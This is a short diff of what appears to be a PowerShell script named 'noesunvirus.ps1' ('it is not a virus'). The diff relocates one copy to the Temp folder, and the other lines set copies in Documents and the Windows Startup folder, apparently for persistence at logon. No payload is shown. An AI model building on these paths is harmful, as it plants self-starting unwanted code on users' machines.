@@ -1,4 +1,4 @@
-$scriptPath1 = "$env:userprofile\Downloads\noesunvirus.ps1"
+$scriptPath1 = "$env:userprofile\AppData\Local\Temp\noesunvirus.ps1"
 $scriptPath2 = "$env:userprofile\Documents\noesunvirus.ps1"
 $scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1"
 $batFilePath = "$env:userprofile\Downloads\start.bat"
